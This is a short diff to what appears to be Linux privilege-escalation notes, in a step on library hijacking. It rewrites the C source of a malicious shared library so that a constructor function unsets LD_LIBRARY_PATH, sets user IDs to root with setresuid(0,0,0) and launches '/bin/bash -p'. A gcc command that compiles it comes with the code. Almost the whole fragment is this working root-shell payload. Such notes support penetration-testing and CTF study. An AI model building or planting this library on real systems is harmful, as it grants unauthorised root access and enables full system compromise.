@@ -41,11 +41,12 @@ a. find the libraries used by the program
 b. compile the library with one of the libraries name
 ```gcc -o /tmp/<libraryname> -shared -fPIC /home/user/library_path.c```
 ```#include <stdio.h>
-#include <sys/types.h>
 #include <stdlib.h>
 
-void _init() {
-	unsetenv("LD_PRELOAD");
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
 	setresuid(0,0,0);
 	system("/bin/bash -p");
 }
